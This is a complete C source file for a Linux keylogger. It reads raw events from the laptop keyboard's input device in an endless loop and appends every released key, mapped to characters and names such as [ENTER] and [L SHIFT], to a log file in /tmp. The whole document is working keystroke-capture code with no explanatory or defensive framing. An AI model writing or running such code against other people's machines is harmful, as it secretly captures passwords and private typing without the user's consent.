#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <linux/input.h>
// #include <linux/input-event-codes.h>

// log file path
#define LOGFILE "/tmp/KeyLogFile.txt"

int main()
{
    struct input_event event;
    // file path of input device keyboard event
    // dev/input/event2
    int inputFile = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY);
    // log file pointer
    FILE * logFile;
    // map of frequently used character
    char *map = "..1234567890-=..qwertyuiop[]..asdfghjkl;'...zxcvbnm,./";

    while(1)
    {
        read(inputFile, &event, sizeof(event));
        if((event.type == EV_KEY) && (event.value == 0))
        {
            logFile = fopen(LOGFILE, "a+");
            // register the key into the logfile
            switch(event.code)
            {
                case 0 : fprintf(logFile, "%s", "[ESC]");
                         break; 
                case 14: fprintf(logFile, "%s", "[BACKSPACE]");
                         break; 
                case 15: fprintf(logFile, "%s", "[TAB]");
                         break; 
                case 28: fprintf(logFile, "%s", "[ENTER]");
                         break;
                case 29: fprintf(logFile, "%s", "[L CTRL]");
                         break;
                case 42: fprintf(logFile, "%s", "[L SHIFT]");
                         break;
                case 43: fprintf(logFile, "%s", "\\");
                         break;
                case 54: fprintf(logFile, "%s", "[R SHIFT]");
                         break;
                case 57: fprintf(logFile, "%s", "[SPACE]");
                         break;
                case 58: fprintf(logFile, "%s", "[CAPSLOCK]");
                         break;
                case 59: fprintf(logFile, "%s", "[F1]");
                         break;
                case 60: fprintf(logFile, "%s", "[F2]");
                         break;
                case 61: fprintf(logFile, "%s", "[F3]");
                         break;
                case 62: fprintf(logFile, "%s", "[F4]");
                         break;
                case 63: fprintf(logFile, "%s", "[F5]");
                         break;
                case 64: fprintf(logFile, "%s", "[F6]");
                         break;
                case 65: fprintf(logFile, "%s", "[F7]");
                         break;
                case 66: fprintf(logFile, "%s", "[F8]");
                         break;
                case 67: fprintf(logFile, "%s", "[F9]");
                         break;
                case 68: fprintf(logFile, "%s", "[F10]");
                         break;
                case 87: fprintf(logFile, "%s", "[F11]");
                         break;
                case 88: fprintf(logFile, "%s", "[F12]");
                         break;
                default: 
                    if((event.code > 0) && (event.code < 55))
                        fprintf(logFile, "%c", map[event.code]);
                    else
                        fprintf(logFile, "[Key Code %d]", event.code);
            }
            fclose(logFile);

            // printf("Key Code %d Typed Now ....\n", event.code);
        }
    }
    
    close(inputFile);
}